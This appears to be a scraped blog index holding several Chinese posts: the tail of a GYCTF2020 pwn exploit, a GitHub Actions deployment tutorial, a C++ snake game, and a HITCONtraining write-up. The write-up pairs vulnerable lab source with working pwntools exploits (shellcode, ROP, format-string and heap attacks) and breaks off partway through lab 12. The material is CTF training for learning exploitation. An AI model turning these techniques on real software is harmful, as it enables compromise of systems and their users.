4edit(1,flat(0,0x21,free_hook-0x10,1)+p64(0)*10)edit(4,p64(system)+p64(1)+p64(0)*12)free(0)","link":"/post/GYCTF2020Pwn/"},{"title":"利用 GitHub Actions 进行持续部署","text":"最近在搞 SDL，尝试了一下 CI/CD 。 背景在开发 pAssWD 的过程中，我发现每次开发到一个阶段，需要给别人展示效果的时候，总是需要经过几个不算太麻烦但是固定的步骤： 运行npm run build 将服务器上原来的spa文件夹删除 把dist/spa目录通过 SFTP 上传到服务器 在spa目录下起一个 http 服务 这些步骤连可变的参数都没有，非常适合自动化。恰好最近实习时的 SDL 项目也需要我对 CI/CD 有所了解，于是我从 pAssWD 项目开始着手实施 CI/CD 流程。 Github Actions我听说了不少持续集成工具，如 Jenkins, Travis 等，但由于代码放在 GitHub 上，考虑到可以和 GitHub Pages 联动，我选择了 GitHub Actions 来实现。 GitHub Actions 非常友好的一点在于，可以直接把 GitHub 上其他开发者编写好的 actions 拿来用，并且 actions 用到的 workflow 文件是优雅的 yaml 格式，可以说对我这种新手来说非常容易入门。 首先创建.github/workflow/目录用来存放不同的 workflow 文件，比如我们新建一个build.yml： 1234567name: buildon: push: branches: [master] pull_request: branches: [master] name即该 workflow 的名称，on表示什么时候触发 Actions，在上述例子中，只有对master分支进行push或者 PR 的时候才会触发 Actions。 1234567891011121314151617jobs: build-and-deploy: runs-on: ubuntu-latest steps: # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it - name: Checkout uses: actions/checkout@v2 # Runs a single command using the runners shell - name: Build and Deploy uses: JamesIves/github-pages-deploy-action@master env: ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }} BRANCH: gh-pages FOLDER: dist/spa BUILD_SCRIPT: npm install &amp;&amp; npm run build 接下来定义jobs，这里我们只有一个 job 也就是build-and-deploy。对于这个 job，我们首先分配一个 runner，即运行这些 Actions 的虚拟机。这些虚拟机是 GitHub 托管的，当然根据文档也可以使用自己的 runner。这里选择了最新的 ubuntu 系统。 然后定义要做的一系列步骤，每个步骤都可以有自己的name。第一步一般先要checkout到自己的这个 repo 下，我们不用关心具体是怎么 checkout 的，因为有actions/checkout@v2帮我们管理了这些步骤。同样的，第二步我们在部署到 Pages 时同样无需关心细节，直接使用了一个部署到 Pages 的 action。 这里需要配置一些参数，首先是个人的 GitHub Token，在Settings-&gt;Developer Settings中可以生成。这是因为在我们用的这个 action 中需要调用 GitHub 的 API，因此需要一个认证 token。注意该 token 需要保密，因此放在项目的Settings-&gt;Secrets里。然后是要部署的分支、部署文件的目录、构建时要执行的命令等，都很容易理解。 至此，build.yml写完了，我们可以尝试push一下，然后在 Actions 页面就能看到已经自动运行的build流程了。 如果遇到了问题，也可以直接展开每一步来查看命令行的输出。 至此就实现了简单的持续部署，也就是 CD 流程。CI 流程类似，不过 pAssWD 的体量不大（我懒得写测试）就没有写测试，于是 CI 这里就没有演示了。 注：实际上，由于我部署到 GitHub Pages，而网站上已经有内容了（就是这个博客），因此实际上是部署到了http://blog_url/pAssWD下。为此需要修改package.json新增一个homepage字段。由于绑定了自己的域名还需要在根目录放一个CNAME文件，就像这个博客的 repo 一样。","link":"/post/GitHubActionsCD/"},{"title":"C++ 练习-贪吃蛇","text":"学一门语言不仅要会写Hello World，还要会写贪吃蛇。对这个不到200行的命令行游戏还算满意。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;ctime&gt;#include &lt;windows.h&gt;#include &lt;conio.h&gt;#define N 28#define UP 72#define DOWN 80#define LEFT 75#define RIGHT 77using namespace std;typedef struct{int x, y;}point;point snake[400], food, next_head;//next_head pos of headchar game_map[N][N];int head, tail;int lv, len, interval;char dir;void gotoxy(int x, int y)//prevent blinking{ HANDLE hConsoleOutput; COORD dwCursorPosition; dwCursorPosition.X = x; dwCursorPosition.Y = y; hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE); SetConsoleCursorPosition(hConsoleOutput, dwCursorPosition);}inline void update(char game_map[][N], int lv, int len, int interval){ gotoxy(0, 0); int i, j; printf(&quot;\\n&quot;); for (i = 0; i &lt; N; ++i){ printf(&quot;\\t\\t&quot;); for (j = 0; j &lt; N; ++j) printf(&quot;%c &quot;, game_map[i][j]); switch(i){ case 0: printf(&quot;\\tLevel: %d&quot;, lv); break; case 4: printf(&quot;\\tLength: %d&quot;, len); break; case 8: printf(&quot;\\tInterval: %3d ms&quot;, interval); break; case 18: printf(&quot;\\tPress Space to Pause&quot;); } printf(&quot;\\n&quot;); }}inline void rand_food(){ srand(int(time(0))); do{ food.x = rand() % 20 + 1; food.y = rand() % 20 + 1; }while (game_map[food.x][food.y] != ' '); game_map[food.x][food.y] = '$';}inline void init(){ int i, j; for (i = 1; i &lt;= N-2; ++i) for (j = 1; j &lt;= N-2; ++j) game_map[i][j] = ' '; for (i = 0; i &lt;= N-1; ++i) game_map[0][i] = game_map[N-1][i] = game_map[i][0] = game_map[i][N-1] = '#'; game_map[1][1] = game_map[1][2] = game_map[1][3] = game_map[1][4] = '@'; game_map[1][5] = 'Q'; head = 4; tail = 0; snake[head].x = 1; snake[head].y = 5; snake[tail].x = 1; snake[tail].y = 1; snake[1].x = 1; snake[1].y = 2; snake[2].x = 1; snake[2].y = 3; snake[3].x = 1; snake[3].y = 4; rand_food(); lv = 0; len = 5; interval = 400; dir = RIGHT; puts(&quot;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\\t\\t\\tPress Any Key&quot;); getch(); update(game_map, lv, len, interval);}inline int mov(){ bool timeover = true; double start = (double)clock() / CLOCKS_PER_SEC; //get total time char tmp;here: //wait for 1s while ((timeover = ((double)clock() / CLOCKS_PER_SEC - start &lt;= interval / 1000.0)) &amp;&amp; !_kbhit()); if (timeover){ char c = getch(); if (c == ' ') { printf(&quot;Game Paused&quot;); while (getch() != ' '); system(&quot;cls&quot;); update(game_map, lv, len, interval); } else if ((c != UP &amp;&amp; c != DOWN &amp;&amp; c != LEFT &amp;&amp; c != RIGHT) || (dir == UP &amp;&amp; c == DOWN) || (dir == DOWN &amp;&amp; c == UP) || (dir == LEFT &amp;&amp; c == RIGHT) || (dir == RIGHT &amp;&amp; c == LEFT)) goto here; else dir = c; } switch (dir){ case UP: next_head.x = snake[head].x - 1; next_head.y = snake[head].y; break; case DOWN: next_head.x = snake[head].x + 1; next_head.y = snake[head].y; break; case LEFT: next_head.x = snake[head].x; next_head.y = snake[head].y - 1; break; case RIGHT: next_head.x = snake[head].x; next_head.y = snake[head].y + 1; break; } if ((!next_head.x || next_head.x == N-1 || !next_head.y || next_head.y == N-1) || //hit the wall (game_map[next_head.x][next_head.y] != ' ' &amp;&amp; !(next_head.x == food.x &amp;&amp; next_head.y == food.y))){ //hit itself puts(&quot;Game Over!\\nReplay? y/n&quot;); while (tolower(tmp = getchar()) != 'y' &amp;&amp; tolower(tmp) != 'n'); if (tmp == 'y') return 2; else return 0; } if (len == 100){ puts(&quot;Congratulations!\\nReplay? y/n&quot;); while (tolower(tmp = getchar()) != 'y' &amp;&amp; tolower(tmp) != 'n'); if (tmp == 'y') return 2; else return 0; } return 1;}inline void eating(){ ++len; int grade = len / 5 - 1; if (grade != lv){ lv = grade; if (interval &gt; 50) interval = 400 - lv * 50; } game_map[next_head.x][next_head.y] = 'Q'; //change head pos game_map[snake[head].x][snake[head].y] = '@'; //head becomes body head = (head + 1) % 400; snake[head].x = next_head.x; snake[head].y = next_head.y; //change head pos rand_food(); update(game_map, lv, len, interval);}inline void not_eating(){ game_map[snake[tail].x][snake[tail].y] = ' '; //tail becomes ' ' tail = (tail + 1) % 400; game_map[next_head.x][next_head.y] = 'Q'; game_map[snake[head].x][snake[head].y] = '@'; head = (head + 1) % 400; snake[head].x = next_head.x; snake[head].y = next_head.y; update(game_map, lv, len, interval);}int main(){ SetConsoleTitle(&quot;Snake&quot;); system(&quot;color 3E&quot;);there: init(); while (1) switch(mov()){ case 1: if (next_head.x == food.x &amp;&amp; next_head.y == food.y) eating(); else not_eating(); break; case 2: system(&quot;cls&quot;); goto there; break; default: return 0; } return 0;}","link":"/post/GluttonousSnake/"},{"title":"HITCONtraining","text":"HITCONtraining更新完成，没咕咕。其中堆题真是很适合入门。 lab1 - sysmagic源码： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;void get_flag(){ int fd ; int password; int magic ; char key[] = &quot;Do_you_know_why_my_teammate_Orange_is_so_angry???&quot;; char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66}; fd = open(&quot;/dev/urandom&quot;,0); read(fd,&amp;password,4); printf(&quot;Give me maigc :&quot;); scanf(&quot;%d&quot;,&amp;magic); if(password == magic){ for(int i = 0 ; i &lt; sizeof(cipher) ; i++){ printf(&quot;%c&quot;,cipher[i]^key[i]); } }}int main(){ setvbuf(stdout,0,2,0); get_flag(); return 0 ;} /dev/urandom的随机数是很难预测的，因此我们只能想办法让if条件判断失效。可以用IDA将对应的jnz语句patch成jz就可以打印flag了。当然也可以gdb设置eip跳过这个jnz。 lab2 - orw本题没有提供源码。开了seccomp沙箱，只能用orw写shellcode，题目会自动执行写入的shellcode。 123456789from pwn import *binary = './orw.bin'context.binary = binaryp = process(binary)shellcode = shellcraft.open('/flag',0) + shellcraft.read('eax','esp',100) + shellcraft.write(1,'esp',100)p.sendlineafter(':',asm(shellcode))p.interactive() lab3 - ret2sc源码： 12345678910111213#include &lt;stdio.h&gt;char name[50];int main(){ setvbuf(stdout,0,2,0); printf(&quot;Name:&quot;); read(0,name,50); char buf[20]; printf(&quot;Try your best:&quot;); gets(buf); return ;} 没有开启NX，因此第一次输入可以输入shellcode放在bss段，第二次输入栈溢出返回到shellcode所在地址。 1234567891011from pwn import *binary = './ret2sc'context.binary = binaryp = process(binary)name = 0x804a060p.sendlineafter(':',asm(shellcraft.sh()))p.sendlineafter(':',flat('a'*32,name))p.interactive() lab4 - ret2lib源码： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;void See_something(unsigned int addr){ int *address ; address = (int *)addr ; printf(&quot;The content of the address : %p\\n&quot;,*address);};void Print_message(char *mesg){ char buf[48]; strcpy(buf,mesg); printf(&quot;Your message is : %s&quot;,buf);}int main(){ char address[10] ; char message[256]; unsigned int addr ; puts(&quot;###############################&quot;); puts(&quot;Do you know return to library ?&quot;); puts(&quot;###############################&quot;); puts(&quot;What do you want to see in memory?&quot;); printf(&quot;Give me an address (in dec) :&quot;); fflush(stdout); read(0,address,10); addr = strtol(address); See_something(addr) ; printf(&quot;Leave some message for me :&quot;); fflush(stdout); read(0,message,256); Print_message(message); puts(&quot;Thanks you ~&quot;); return 0 ;} 经典的ret2libc题目，第一次输入可以直接泄露GOT地址，第二次栈溢出返回到system(&quot;/bin/sh&quot;)。 1234567sla(':',elf.got['puts'])ru('0x')puts = int(ru('\\n'),16)base,libc,system = leak_libc('puts',puts)binsh = base+libc.dump('str_bin_sh')sla(':',flat('a'*60,system,'a'*4,binsh)) lab5 - simplerop源码： 12345678910#include &lt;stdio.h&gt;int main(){ char buf[20]; puts(&quot;ROP is easy is'nt it ?&quot;); printf(&quot;Your input :&quot;); fflush(stdout); read(0,buf,100);} 程序是静态链接的，其中有很多gadgets但没有/bin/sh，因此我们需要自己写到bss段上去，然后ret2syscall。 123456789101112131415read = 0x806cd50pop_eax = 0x80bae06pop_dcb = 0x806e850int_80 = 0x80493e1chain = [ 'a'*32, # read(0,bss,8) read,pop_dcb,0,elf.bss(),8, # execve('/bin/sh',0,0) pop_dcb,0,0,elf.bss(),pop_eax,0xb,int_80]sla(':',flat(chain))s('/bin/sh\\x00') lab6 - migration源码： 1234567891011121314#include &lt;stdio.h&gt;int count = 1337 ;int main(){ if(count != 1337) _exit(1); count++; char buf[40]; setvbuf(stdout,0,2,0); puts(&quot;Try your best :&quot;); read(0,buf,64); return ;} 设置了count使得main不能执行第二次。这导致我们无法直接实现ret2libc，同时栈溢出的空间较小，放不下ROP链，因此考虑栈迁移。 首先通过read读取泄露libc的ROP链到buf，然后leave_ret迁移到buf。继续read读取system(&quot;/bin/sh&quot;)的ROP链到fub，然后leave_ret迁移到fub。 1234567891011121314151617buf = elf.bss()+0x300fub = elf.bss()+0x400leave_ret = 0x8048418pop3 = 0x8048569pop_ebx = 0x804836dpayload = flat('a'*0x28,buf,elf.plt['read'],leave_ret,0,buf,0x100)sa(':\\n',payload)payload = flat(fub,elf.plt['puts'],pop_ebx,elf.got['puts'],elf.plt['read'],leave_ret,0,fub,0x100)s(payload)puts = u32(r(4))base,libc,system = leak_libc('puts',puts)binsh = base + libc.dump('str_bin_sh')payload = flat('a'*4,system,'a'*4,binsh)s(payload) lab7 - crack源码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;unsigned int password ;int main(){ setvbuf(stdout,0,2,0); char buf[100]; char input[16]; int fd ; srand(time(NULL)); fd = open(&quot;/dev/urandom&quot;,0); read(fd,&amp;password,4); printf(&quot;What your name ? &quot;); read(0,buf,99); printf(&quot;Hello ,&quot;); printf(buf); printf(&quot;Your password :&quot;); read(0,input,15); if(atoi(input) != password){ puts(&quot;Goodbyte&quot;); }else{ puts(&quot;Congrt!!&quot;); system(&quot;cat /home/crack/flag&quot;); }} 存在格式化字符串漏洞，考虑利用该漏洞修改password为确定的值，然后输入该值即可。 12345678910111213def exec_fmt(payload): io = process(binary) io.sendlineafter('?',payload) io.recvuntil('Hello ,') info = io.recvline() io.close() return infoauto = FmtStr(exec_fmt)password = 0x804a048payload = fmtstr_payload(auto.offset,{password:1234})sla('?',payload)sla(':',1234) lab8 - craxme源码： 1234567891011121314151617181920#include &lt;stdio.h&gt;int magic = 0 ;int main(){ char buf[0x100]; setvbuf(stdout,0,2,0); puts(&quot;Please crax me !&quot;); printf(&quot;Give me magic :&quot;); read(0,buf,0x100); printf(buf); if(magic == 0xda){ system(&quot;cat /home/craxme/flag&quot;); }else if(magic == 0xfaceb00c){ system(&quot;cat /home/craxme/craxflag&quot;); }else{ puts(&quot;You need be a phd&quot;); }} 同样是格式化字符串漏洞，存在两种利用方法。一种是直接覆盖magic满足条件： 1234567891011def exec_fmt(payload): io = process(binary) io.sendlineafter(':',payload) info = io.recvline() io.close() return infoauto = FmtStr(exec_fmt)magic = 0x804a038payload = fmtstr_payload(auto.offset,{magic:0xda})sla(':',payload) 另一种是用main中的read开始的语句覆盖puts，然后用system覆盖printf来拿到shell。 1234main_read = 0x804859bpayload = fmtstr_payload(auto.offset,{elf.got['puts']:main_read,elf.got['printf']:elf.plt['system']})sla(':',payload)sl('/bin/sh') lab9 - playfmt源码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[200] ;void do_fmt(){ while(1){ read(0,buf,200); if(!strncmp(buf,&quot;quit&quot;,4)) break; printf(buf); } return ;}void play(){ puts(&quot;=====================&quot;); puts(&quot; Magic echo Server&quot;); puts(&quot;=====================&quot;); do_fmt(); return;}int main(){ setvbuf(stdout,0,2,0); play(); return;} 本题依然是格式化字符串漏洞，但问题在于这次并不会将数据读入栈上，而是读入bss段。这使得常规fsb利用方式失效，但是我们依然可以通过修改saved ebp来达到任意地址读写。 在printf前查看栈情况： 1234567891011121300:0000│ esp 0xffffcd60 —▸ 0x804a060 (buf) ◂— 'aaaa\\n'01:0004│ 0xffffcd64 —▸ 0x8048640 ◂— jno 0x80486b7 /* 'quit' */02:0008│ 0xffffcd68 ◂— 0x403:000c│ 0xffffcd6c —▸ 0x804857c (play+51) ◂— add esp, 0x1004:0010│ 0xffffcd70 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d05:0014│ 0xffffcd74 —▸ 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db006:0018│ ebp 0xffffcd78 —▸ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x007:001c│ 0xffffcd7c —▸ 0x8048584 (play+59) ◂— nop08:0020│ 0xffffcd80 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│ 0xffffcd84 ◂— 0x00a:0028│ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x00b:002c│ 0xffffcd8c —▸ 0x80485b1 (main+42) ◂— nop0c:0030│ 0xffffcd90 —▸ 0xf7fb63dc (__exit_funcs) —▸ 0xf7fb71e0 (initial) ◂— 0x0 可以看到saved ebp在6$位置，它实际上指向位于10$的0xffffcd88。也就是说，如果我们能通过%n修改saved ebp，实际上就能修改10$的位置。 然而，10$这个位置同样可以是一个指针。同理我们也可以%n修改10$指向的地址。除了修改，我们同样可以泄露，那么自然想到泄露libc函数的GOT地址，再覆盖成system的做法。 因此思路如下，记栈上偏移为10的地址为ebp2，偏移为7和11的地址分别为s7和s11。 通过ebp修改ebp2指向s7 通过ebp2将s7覆盖为printf@got 通过ebp修改ebp2指向s11 通过ebp2将s11覆盖为printf@got+2 通过%7$s泄露s7处的printf@got，从而泄露libc 用system@plt低2字节覆盖s7处的printf@got 用system@plt高2字节覆盖s11处的printf@got+2 输入/bin/sh\\x00，调用printf(&quot;/bin/sh&quot;)即getshell 当然也可以4字节直接写，但是由于字符数过多会导致速度非常慢，不推荐。此外，需要注意即使是2字节写依然会有延迟，需要多次recv()接收返回的字符串，直到发送的特殊字符串能够收到为止，算是fsb利用时的一个小技巧。 12345678910111213141516171819202122232425262728293031323334353637hn = lambda addr,offset: '%{}c%{}$hn'.format(addr,offset)def delay(): while True: sl('delay') sleep(0.2) data = r() if data.find('delay') != -1: breakfor i in range(3): ru('\\n')sl('%6$p')ebp2 = int(ru('\\n'),16)ebp = ebp2-0x10s7 = ebp2-0xcs11 = ebp2+4mask = 0xffffprintf = elf.got['printf']sl(hn(s7&amp;mask,6))sl(hn(printf&amp;mask,10))delay()sl(hn(s11&amp;mask,6))sl(hn((printf+2)&amp;mask,10))delay()sl('aaaa%7$s')ru('aaaa')printf = u32(r(4))leak('printf',printf)base,libc,system = leak_libc('printf',printf)sl(hn(system&amp;mask,7)+hn((system&gt;&gt;16)-(system&amp;mask),11))delay()sl('/bin/sh\\x00') lab10 - hacknote源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;struct note { void (*printnote)(); char *content ;};struct note *notelist[5];int count = 0;void print_note_content(struct note *this){ puts(this-&gt;content);}void add_note(){ int i ; char buf[8]; int size ; if(count &gt; 5){ puts(&quot;Full&quot;); return ; } for(i = 0 ; i &lt; 5 ; i ++){ if(!notelist[i]){ notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i]){ puts(&quot;Alloca Error&quot;); exit(-1); } notelist[i]-&gt;printnote = print_note_content; printf(&quot;Note size :&quot;); read(0,buf,8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if(!notelist[i]-&gt;content){ puts(&quot;Alloca Error&quot;); exit(-1); } printf(&quot;Content :&quot;); read(0,notelist[i]-&gt;content,size); puts(&quot;Success !&quot;); count++; break; } }}void del_note(){ char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count){ puts(&quot;Out of bound!&quot;); _exit(0); } if(notelist[idx]){ free(notelist[idx]-&gt;content); free(notelist[idx]); puts(&quot;Success&quot;); }}void print_note(){ char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count){ puts(&quot;Out of bound!&quot;); _exit(0); } if(notelist[idx]){ notelist[idx]-&gt;printnote(notelist[idx]); }}void magic(){ system(&quot;cat /home/hacknote/flag&quot;);}void menu(){ puts(&quot;----------------------&quot;); puts(&quot; HackNote &quot;); puts(&quot;----------------------&quot;); puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;----------------------&quot;); printf(&quot;Your choice :&quot;);};int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(&quot;Invalid choice&quot;); break ; } } return 0;} 经典的uaf利用，做法和ACTF2019-babyheap以及BJDCTF2019-YDSneedGirlfriend完全相同。 123456add(0x10)add(0x10)delete(0)delete(1)add(0x8,p32(elf.sym['magic']))show(0) lab11 - bamboobox源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;struct item{ int size ; char *name ;};struct item itemlist[100] = {0};int num ;void hello_message(){ puts(&quot;There is a box with magic&quot;); puts(&quot;what do you want to do in the box&quot;);}void goodbye_message(){ puts(&quot;See you next time&quot;); puts(&quot;Thanks you&quot;);}struct box{ void (*hello_message)(); void (*goodbye_message)();};void menu(){ puts(&quot;----------------------------&quot;); puts(&quot;Bamboobox Menu&quot;); puts(&quot;----------------------------&quot;); puts(&quot;1.show the items in the box&quot;); puts(&quot;2.add a new item&quot;); puts(&quot;3.change the item in the box&quot;); puts(&quot;4.remove the item in the box&quot;); puts(&quot;5.exit&quot;); puts(&quot;----------------------------&quot;); printf(&quot;Your choice:&quot;);}void show_item(){ int i ; if(!num){ puts(&quot;No item in the box&quot;); }else{ for(i = 0 ; i &lt; 100; i++){ if(itemlist[i].name){ printf(&quot;%d : %s&quot;,i,itemlist[i].name); } } puts(&quot;&quot;); }}int add_item(){ char sizebuf[8] ; int length ; int i ; int size ; if(num &lt; 100){ printf(&quot;Please enter the length of item name:&quot;); read(0,sizebuf,8); length = atoi(sizebuf); if(length == 0){ puts(&quot;invaild length&quot;); return 0; } for(i = 0 ; i &lt; 100 ; i++){ if(!itemlist[i].name){ itemlist[i].size = length ; itemlist[i].name = (char*)malloc(length); printf(&quot;Please enter the name of item:&quot;); size = read(0,itemlist[i].name,length); itemlist[i].name[size] = '\\x00'; num++; break; } } }else{ puts(&quot;the box is full&quot;); } return 0;}void change_item(){ char indexbuf[8] ; char lengthbuf[8]; int length ; int index ; int readsize ; if(!num){ puts(&quot;No item in the box&quot;); }else{ printf(&quot;Please enter the index of item:&quot;); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ printf(&quot;Please enter the length of item name:&quot;); read(0,lengthbuf,8); length = atoi(lengthbuf); printf(&quot;Please enter the new name of the item:&quot;); readsize = read(0,itemlist[index].name,length); *(itemlist[index].name + readsize) = '\\x00'; }else{ puts(&quot;invaild index&quot;); } }}void remove_item(){ char indexbuf[8] ; int index ; if(!num){ puts(&quot;No item in the box&quot;); }else{ printf(&quot;Please enter the index of item:&quot;); read(0,indexbuf,8); index = atoi(indexbuf); if(itemlist[index].name){ free(itemlist[index].name); itemlist[index].name = 0 ; itemlist[index].size = 0 ; puts(&quot;remove successful!!&quot;); num-- ; }else{ puts(&quot;invaild index&quot;); } }}void magic(){ int fd ; char buffer[100]; fd = open(&quot;/home/bamboobox/flag&quot;,O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(&quot;%s&quot;,buffer); exit(0);}int main(){ char choicebuf[8]; int choice; struct box *bamboo ; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); bamboo = malloc(sizeof(struct box)); bamboo-&gt;hello_message = hello_message; bamboo-&gt;goodbye_message = goodbye_message ; bamboo-&gt;hello_message(); while(1){ menu(); read(0,choicebuf,8); choice = atoi(choicebuf); switch(choice){ case 1: show_item(); break; case 2: add_item(); break; case 3: change_item(); break; case 4: remove_item(); break; case 5: bamboo-&gt;goodbye_message(); exit(0); break; default: puts(&quot;invaild choice!!!&quot;); break; } } return 0 ;} 存在全局数组itemlist，第一种办法就是利用它进行unlink，劫持atoi到magic： 12345678910111213141516ptr = 0x6020c8add(0x80)add(0x80)add(0x80)fd = ptr-0x18bk = ptr-0x10payload = flat(0,0x81,fd,bk,'a'*0x60,0x80,0x90)edit(0,len(payload),payload)delete(1)# hijack to magicpayload = flat(0,0,0,elf.got['atoi'])edit(0,len(payload),payload)edit(0,0x8,p64(elf.sym['magic']))sla('choice:','5') 或者劫持到system也可以： 123456789# OR hijack to systempayload = flat(0,0,0,elf.got['atoi'])edit(0,len(payload),payload)show()ru('0 : ')atoi = uu64(ru('2 :'))system,binsh = ret2libc(atoi,'atoi')edit(0,0x8,p64(system))sla('choice:','/bin/sh\\x00') 第二种办法是House of Force。程序开头就malloc了0x10的box用来放两个函数，其中第二个会在退出时调用，我们只需要覆盖第二个函数为magic即可。先通过溢出修改top chunk大小为-1，然后计算evil_size：减去自身大小以及box的大小，再减去一个头部的大小即可。这种方法简单了很多。 123456add(0x60)edit(0,0x70,flat('a'*0x60,0,0xffffffffffffffff))evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10add(evil_size)add(0x10,p64(elf.sym['magic'])*2)sla('choice:','5') lab12 - secretgarden源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#define TIMEOUT 60struct flower{ int vaild ; char *name ; char color[24] ;};struct flower* flowerlist[100] ;unsigned int flowercount = 0 ;void menu(){ puts(&quot;&quot;); puts(&quot;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ &quot;); puts(&quot;☆ Baby Secret Garden ☆ &quot;); puts(&quot;☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ &quot;); puts(&quot;&quot;); puts(&quot; 1 . Raise a flower &quot; ); puts(&quot; 2 . Visit the garden &quot;); puts(&quot; 3 . Remove a flower from the garden&quot;); puts(&quot; 4 . Clean the garden&quot;); puts(&quot; 5 . Leave the garden&quot;); puts(&quot;&quot;); printf(&quot;Your choice : &quot;);}int add(){ struct flower *newflower = NULL ; char *buf = NULL ; unsigned size =0; unsigned index ; if(flowercount &lt; 100){ newflower = malloc(sizeof(struct flower)); memset(newflower,0,sizeof(struct flower)); printf(&quot;Length of the name :&quot;); if(scanf(&quot;%u&quot;,&amp;size)== EOF) exit(-1); buf = (char*)malloc(size); if(!buf){ puts(&quot;Alloca error !!&quot;); exit(-1); } printf(&quot;The name of flower :&quot;); read(0,buf,size); newflower-&gt;name = buf ; printf(&quot;The color of the flower :&quot;); scanf(&quot;%23s&quot;,newflower-&gt;color); newflower-&gt;vaild = 1 ; for(index = 0 ; index &lt; 100 ; index++ ){ if(!flowerlist[index]){ flowerlist[index] = newflower ; break ; } } flowercount++ ; puts(&quot;Successful !&quot;); }else{ puts(&quot;The garden is overflow&quot;); }}int del(){ unsigned int index ; if(!flowercount){ puts(&quot;No flower in the garden&quot;); }else{ printf(&quot;Which flower do you want to remove from the garden:&quot;); scanf(&quot;%d&quot;,&amp;index); if(index &lt; 0 ||index &gt;= 100 || !flowerlist[index]){ puts(&quot;Invalid choice&quot;); return 0 ; } (flowerlist[index])-&gt;vaild = 0 ; free((flowerlist[index])-&gt;name); puts(&quot;Successful&quot;); }}void magic(){ int fd ; char buffer[100]; fd = open(&quot;/home/babysecretgarden/flag&quot;,O_RDONLY); read(fd,buffer,sizeof(buffer)); close(fd); printf(&quot;%s&quot;,buffer); exit(0);}void clean(){ unsigned index ; for(index = 0 ; index &lt; 100 ; index++){ if(flowerlist[index] &amp;&amp; (flowerlist[index])-&gt;vaild == 0){ free(flowerlist[index]); flowerlist[index] = NULL; flowercount--; } } puts(&quot;Done!&quot;);}int visit(){ unsigned index ; if(!flowercount){ puts(&quot;No flower in the garden !&quot;); }else{ for(index = 0 ; index &lt; 100 ; index++){ if(flowerlist[index] &amp;&amp; (flowerlist[index])-&gt;vaild){ printf(&quot;Name of the flower[%u] :%s\\n&quot;,index,(flowerlist[index])-&gt;name); printf(&quot;Color of the flower[%u] :%s\\n&quot;,index,(flowerlist[index])-&gt;color); } } }}void handler(int signum){ puts(&quot;timeout&quot;); exit(1);}void init(){ int fd; fd = open(&quot;/dev/urandom&quot;,0); close(fd); 